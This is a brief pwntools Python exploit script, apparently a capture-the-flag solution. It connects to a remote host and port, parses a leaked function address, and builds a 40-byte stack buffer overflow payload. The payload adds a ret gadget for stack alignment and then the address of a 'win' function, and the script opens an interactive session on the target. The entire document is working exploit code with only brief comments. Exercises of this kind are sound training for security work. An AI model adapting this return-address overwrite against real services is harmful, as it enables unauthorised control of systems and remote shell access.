from pwn import *

context.arch = 'amd64'

r = remote('136.115.87.65', 31776)
line = r.recvline().decode()
print("Received:", line)

key_addr = int(line.split(' ')[1].strip(), 16)
print("Key addr (endbr64):", hex(key_addr))

# The binary prints the address of the win function
# We need an extra `ret` gadget to align the stack to 16 bytes for `system`
ret_addr = key_addr + (0x11a2 - 0x1189)
win_addr = key_addr + (0x118d - 0x1189)

# Buffer is 32 bytes + 8 bytes saved RBP = 40 bytes offset to RIP
payload = b"A" * 40
payload += p64(ret_addr)
payload += p64(win_addr)

r.sendline(payload)
r.interactive()
